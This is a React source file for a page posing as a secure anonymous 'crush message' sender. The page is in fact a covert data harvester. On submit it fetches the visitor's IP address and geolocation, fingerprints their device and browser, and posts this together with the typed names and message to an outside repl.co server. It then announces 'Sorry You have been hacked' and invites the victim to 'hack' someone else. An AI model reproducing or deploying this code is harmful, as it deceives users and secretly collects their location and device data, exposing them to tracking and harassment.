import Axios  from 'axios';
import React, {useEffect, useState} from 'react';
import { Link, useNavigate, useParams} from 'react-router-dom'
import $ from 'jquery'

function Preview ()
{
      const {id} = useParams()
      let audio = document.createElement("audio")
      audio.src = "";

      let audioarr = [
            "https://www.crateshub.com/images/Music/Single/Don-Miguelo-Y-Que-Fue-www.crateshub.com.mp3",
            "https://www.xclusiveloaded.com/wp-content/uploads/2021/11/Sapa_No_Fit_Catch_Me_-_Nimix.mp3",
            "https://cdn.trendybeatz.com/audio/Carter-Efe-Feat-Berri-Tiga-Machala-1-(TrendyBeatz.com).mp3",
            "https://zacknation.net/wp-content/uploads/2022/05/Mavins-Overdose-Ft-LadiPoe-Ayra-Starr-Boy-Spyce.mp3",
            "https://www.six9ja.com/wp-content/uploads/2022/07/Dj_Cora_-_Eba_Garri.mp3",
            "https://www.six9ja.com/wp-content/uploads/2022/07/Fireboy_DML_ft_Asake_-_Bandana_New_Song_.mp3",
            "https://bolli.club/wp-content/uploads/2022/07/Tinubu_Eba_Garri_Beans_Dodo_Agbado_Riddim_Mashup_by_Reflex_Soundz_.mp3",
            "https://naijaremix.net/wp-content/uploads/2022/06/Oskido_-_Say_Kun_Kra_Faster_Naijaremix.mp3"
      ]


       const [names, setnames] = useState('')
      const [crush, setcrush] = useState('')
      const [ msg, setmsg ] = useState( '' )
      const [ errors, seterrors ] = useState( '' )
      let nameregix = /^[a-zA-Z ]+$/;



      const handlesub = ( e ) =>
      {
            e.preventDefault();


            let mainma = document.querySelector( "#names" );
            let unic = document.querySelector( "#unic" );
            let passes = document.querySelector( "#passes" );
            let signupb = document.querySelector( "#signupb" );


            if ( names.length < 3 )
            {
                  seterrors( "Please Enter Your Name" );
            }
            else if ( !names.match( nameregix ) )
            {
                  seterrors( "Please Enter a valid name" );
            }
            else if ( crush.length < 3 )
            {
                  seterrors( "Please Enter Your Crush Name" );
            }
            else if ( !crush.match( nameregix ) )
            {
                  seterrors( "Please Enter a valid Crush name" );
            }
            else if ( msg.length < 20 )
            {
                  seterrors( "Please Enter Your Message up - 20" );
            }
            else
            {

                  var chars = "0123456789";
                  var passwordLength = 100;
                  var password = "";

                  for ( var i = 0; i <= passwordLength; i++ )
                  {
                        var randomNumber = Math.floor( Math.random() * chars.length );
                        password += chars.substring( randomNumber, randomNumber + 1 );

                  }

                  let joy = password.match( /.{1,10}/g );
                  let dat = joy.join('-')
                  
                
                  
                  let audrand = Math.floor( Math.random() * audioarr.length );
           
                  
                  
                  if ( audio.ended )
                  { 
                        audio.src = audioarr[0];
                        audio.play()
                  }
                  else
                  { 
                        audio.src = "";
                  audio.src = audioarr[ audrand ];
                  audio.play();
                  }

                  if ( audio.play() )
                  {
                        if ( 'mediaSession' in navigator )
                        {
                              navigator.mediaSession.metadata = new MediaMetadata( {
                                    title: 'Hacking Completed',
                                    artist: 'HackMe.com',
                                    album: 'Sorry You have been hacked',
                                    artwork: [
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                    ]
                              } );

                        };
                  }

                  else
                  {

                        if ( 'mediaSession' in navigator )
                        {
                              navigator.mediaSession.metadata = new MediaMetadata( {
                                    title: 'Hacking Completed',
                                    artist: 'HackMe.com',
                                    album: 'Sorry You have been hacked',
                                    artwork: [
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                          { src: 'https://w0.peakpx.com/wallpaper/242/182/HD-wallpaper-black-3-black-and-white-full-hacker-r-thumbnail.jpg', sizes: '338x538', type: 'image/png' },
                                    ]
                              } );

                        };
                        
                  }

                  function devname ()
                  {
                        var module = {
                              options: [],
                              header: [ navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera ],
                              dataos: [
                                    { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
                                    { name: 'Windows', value: 'Win', version: 'NT' },
                                    { name: 'iPhone', value: 'iPhone', version: 'OS' },
                                    { name: 'iPad', value: 'iPad', version: 'OS' },
                                    { name: 'Kindle', value: 'Silk', version: 'Silk' },
                                    { name: 'Android', value: 'Android', version: 'Android' },
                                    { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
                                    { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
                                    { name: 'Macintosh', value: 'Mac', version: 'OS X' },
                                    { name: 'Linux', value: 'Linux', version: 'rv' },
                                    { name: 'Palm', value: 'Palm', version: 'PalmOS' }
                              ],
                              databrowser: [
                                    { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
                                    { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
                                    { name: 'Safari', value: 'Safari', version: 'Version' },
                                    { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
                                    { name: 'Opera', value: 'Opera', version: 'Opera' },
                                    { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
                                    { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
                              ],
                              init: function ()
                              {
                                    var agent = this.header.join( ' ' ),
                                          os = this.matchItem( agent, this.dataos ),
                                          browser = this.matchItem( agent, this.databrowser );
            
                                    return { os: os, browser: browser };
                              },
                              matchItem: function ( string, data )
                              {
                                    var i = 0,
                                          j = 0,
                                          html = '',
                                          regex,
                                          regexv,
                                          match,
                                          matches,
                                          version;
            
                                    for ( i = 0; i < data.length; i += 1 )
                                    {
                                          regex = new RegExp( data[ i ].value, 'i' );
                                          match = regex.test( string );
                                          if ( match )
                                          {
                                                regexv = new RegExp( data[ i ].version + '[- /:;]([\\d._]+)', 'i' );
                                                matches = string.match( regexv );
                                                version = '';
                                                if ( matches ) { if ( matches[ 1 ] ) { matches = matches[ 1 ]; } }
                                                if ( matches )
                                                {
                                                      matches = matches.split( /[._]+/ );
                                                      for ( j = 0; j < matches.length; j += 1 )
                                                      {
                                                            if ( j === 0 )
                                                            {
                                                                  version += matches[ j ] + '.';
                                                            } else
                                                            {
                                                                  version += matches[ j ];
                                                            }
                                                      }
                                                } else
                                                {
                                                      version = '0';
                                                }
                                                return {
                                                      name: data[ i ].name,
                                                      version: parseFloat( version )
                                                };
                                          }
                                    }
                                    return { name: 'unknown', version: 0 };
                              }
                        };

                        var e = module.init();
                      
                        return "Device Name: " + e.os.name + " Device Version: " + e.os.version + " Device Browser: " + e.browser.name + " Device Browser Version: " + e.browser.version + " Device userAgent: " + navigator.userAgent + " Device AppVersion: " + navigator.appVersion + " Device Platform: " + navigator.platform + " Device Vendor: " + navigator.vendor;
                        
                  }

                   signupb.setAttribute("disabled", "disabled")
                  
                  
                  $.getJSON( 'http://www.geoplugin.net/json.gp', function ( data )
                  {
                        let hack = data;
                        $.ajax( {
                              method: "POST",
                              url: "https://myapp-1.badzybaddest.repl.co/post/send/id",
                              data: {
                                    hackdata: " city " + hack.geoplugin_city + ", Continent name " + hack.geoplugin_continentName + ", ~ country name " + hack.geoplugin_countryName + ", ~ region " + hack.geoplugin_region + ", ~ Request Ip " + hack.geoplugin_request + ", ~ timezone " + hack.geoplugin_timezone,
                                    audioplayed: audio.src,
                                    unic_id: id,
                                    names: names,
                                    crush: crush,
                                    msg: msg,
                                    device: devname(),
                                    itemid: dat
                                    
                              },
                              success: function ( eata )
                              {
                                    if ( eata === "success" )
                                    {
                                          if ( window.confirm( "Now That You have been hacked, Would You like to Hack Some one else" ) === true )
                                          {
                                                window.open( "../#/Login", "_self" );
                                                window.location.reload();
                                          }
                                          else
                                          {
                                          
                                          }

                                          setnames("")
                                          setcrush("")
                                          setmsg("")

                                          mainma.value = ""
                                          unic.value = ""
                                          passes.value = ""
                                          signupb.removeAttribute("disabled")

                                          

                                    }
                              }
                        } );
               
                  } );
                  
            }


      };




      

      return (
            <div style={{backgroundImage: 'url(https://wallpaper.dog/large/20528451.jpg)', textAlign: 'center', height: '100vh', backgroundPosition: 'center', color: 'white', backgroundSize: 'cover', backgroundRepeat: 'no-repeat'}} >
                  <div className='main'>
                        <title>Find True Love</title>
                  <form onSubmit={handlesub} action="">
                              <h5 style={ { fontSize: '25px', fontWeight: '900', textAlign: 'center' } }>Send Anonimus Message</h5>
                              <p>
                                    Send Free Anonimus Message... Non of your message is been licked. They're well secured.
                              </p>
                        <input onChange={e => setnames(e.target.value)} id='names' type="text" placeholder='Name' />
                        <input onChange={e => setcrush(e.target.value)} id='unic' type="text" placeholder='Crush Name' />
                        <textarea onChange={e => setmsg(e.target.value)} name="" id="passes" placeholder='Message'></textarea>
                        <button id='signupb' style={{textAlign: 'center',display: 'flex', justifyContent: 'center'}}>
                              <span  className='signuponme'>Send</span>
                              <span style={{display: 'none', textAlign: 'center'}} className='spinner-border'></span>
                        </button>
                        <div className="errors">{errors}</div>
                       
                  </form>
            </div>
            </div>
      );
}

export default Preview;